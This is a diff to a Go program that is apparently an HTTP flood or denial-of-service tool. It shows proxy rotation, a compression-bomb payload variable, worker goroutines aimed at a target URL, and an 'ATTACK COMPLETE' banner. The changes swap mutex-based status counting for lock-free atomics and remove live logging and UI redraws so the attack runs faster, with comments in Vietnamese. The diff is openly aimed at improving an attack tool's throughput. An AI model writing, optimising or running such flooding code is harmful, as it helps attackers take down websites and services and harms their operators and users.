@@ -48,12 +48,11 @@ var totalErrors atomic.Int64
 var proxyList []string
 var zstdBombPayload []byte
 var startTime time.Time
-var statusCounts = make(map[string]int)
-var statusMutex = sync.Mutex{}
-var logBuf bytes.Buffer
-var logMutex = sync.Mutex{}
-var maxLogLines = 10
-var logLines []string
+
+// Zero-Lock status recording (giữ nguyên tốc độ, không dùng Mutex)
+var statusCodes [600]atomic.Int64
+var miscStatusCounts sync.Map
+
 var cBlink = "\033[5m"
 
 func init() {
@@ -124,19 +123,25 @@ func loadProxies(filename string) ([]string, error) {
 }
 
 func recordStatus(code string) {
-    statusMutex.Lock()
-    statusCounts[code]++
-    statusMutex.Unlock()
-}
-
-func logEvent(msg string) {
-    logMutex.Lock()
-    defer logMutex.Unlock()
-    timestamp := time.Now().Format("15:04:05")
-    entry := fmt.Sprintf("[%s] %s", timestamp, msg)
-    logLines = append(logLines, entry)
-    if len(logLines) > maxLogLines {
-        logLines = logLines[len(logLines)-maxLogLines:]
+    // Tối ưu Zero-lock để thay thế cho sync.Mutex cũ, chạy nhanh hơn và không block luồng
+    if len(code) == 3 {
+        if n, err := strconv.Atoi(code); err == nil && n >= 0 && n < 600 {
+            statusCodes[n].Add(1)
+            return
+        }
+    }
+    for {
+        v, ok := miscStatusCounts.Load(code)
+        if !ok {
+            if miscStatusCounts.CompareAndSwap(code, nil, int64(1)) {
+                return
+            }
+        } else {
+            nv := v.(int64) + 1
+            if miscStatusCounts.CompareAndSwap(code, v, nv) {
+                return
+            }
+        }
     }
 }
 
@@ -249,29 +254,29 @@ func drawUI(target, method, proxyFile string, workers, duration int) {
         cBold + "STATUS CODES:" + cReset,
     }
 
-    statusMutex.Lock()
-    keys := make([]string, 0, len(statusCounts))
-    for k := range statusCounts {
-        keys = append(keys, k)
-    }
-    for i := 0; i < len(keys); i++ {
-        for j := i + 1; j < len(keys); j++ {
-            if keys[i] > keys[j] {
-                keys[i], keys[j] = keys[j], keys[i]
+    // Đọc mảng zero-lock để lấy số lượng status code
+    for i := 0; i < 600; i++ {
+        n := statusCodes[i].Load()
+        if n > 0 {
+            color := cGreen
+            if i >= 400 && i < 600 {
+                color = cRed
+            } else if i >= 300 {
+                color = cYellow
             }
+            infoLines = append(infoLines, "  "+color+strconv.Itoa(i)+cReset+": "+strconv.FormatInt(n, 10))
         }
     }
-
-    for _, k := range keys {
-        color := cGreen
-        if k == "Err" || strings.HasPrefix(k, "4") || strings.HasPrefix(k, "5") {
-            color = cRed
-        } else if strings.HasPrefix(k, "3") {
-            color = cYellow
+    miscStatusCounts.Range(func(key, value interface{}) bool {
+        k := key.(string)
+        v := value.(int64)
+        color := cRed
+        if k == "Sent" || k == "Held" || k == "RST" {
+            color = cGreen
         }
-        infoLines = append(infoLines, "  "+color+k+cReset+": "+strconv.Itoa(statusCounts[k]))
-    }
-    statusMutex.Unlock()
+        infoLines = append(infoLines, "  "+color+k+cReset+": "+strconv.FormatInt(v, 10))
+        return true
+    })
 
     maxLines := len(logo)
     if len(infoLines) > maxLines {
@@ -290,13 +295,6 @@ func drawUI(target, method, proxyFile string, workers, duration int) {
         }
         fmt.Println(l)
     }
-    fmt.Println()
-    fmt.Println(cBold + cCyan + "LIVE LOGS:" + cReset)
-    logMutex.Lock()
-    for _, line := range logLines {
-        fmt.Println(line)
-    }
-    logMutex.Unlock()
     fmt.Println()
     fmt.Println(cDim + "Press Ctrl+C to stop..." + cReset)
 }
@@ -329,7 +327,7 @@ func newTransport(proxyURL *url.URL) *http.Transport {
         ResponseHeaderTimeout: responseHeaderTimeout,
         DisableKeepAlives:     false,
         DisableCompression:    true,
-        ForceAttemptHTTP2:     false,
+        ForceAttemptHTTP2:    false,
     }
     if proxyURL != nil {
         t.Proxy = http.ProxyURL(proxyURL)
@@ -6016,18 +6014,10 @@ func main() {
         go Worker(i, targetURL, *method, clients, stop, *verbose, *rateDelay)
     }
 
-    ticker := time.NewTicker(100 * time.Millisecond)
-    defer ticker.Stop()
-
-    for {
-        select {
-        case <-time.After(time.Duration(duration) * time.Second):
-            close(stop)
-            drawUI(targetURL, *method, proxyFile, workers, duration)
-            fmt.Printf("\n  %s\033[1m\033[31mATTACK COMPLETE\033[0m\n", cBlink)
-            os.Exit(0)
-        case <-ticker.C:
-            drawUI(targetURL, *method, proxyFile, workers, duration)
-        }
-    }
+    // TẮT HOÀN TOÀN VIỆC VẼ UI LIÊN TỤC CHỈ CHẠY ĐẾN HẾT TIME RỒI MỚI IN 1 LẦN DUY NHẤT
+    time.Sleep(time.Duration(duration) * time.Second)
+    close(stop)
+    drawUI(targetURL, *method, proxyFile, workers, duration)
+    fmt.Printf("\n  %s\033[1m\033[31mATTACK COMPLETE\033[0m\n", cBlink)
+    os.Exit(0)
 }
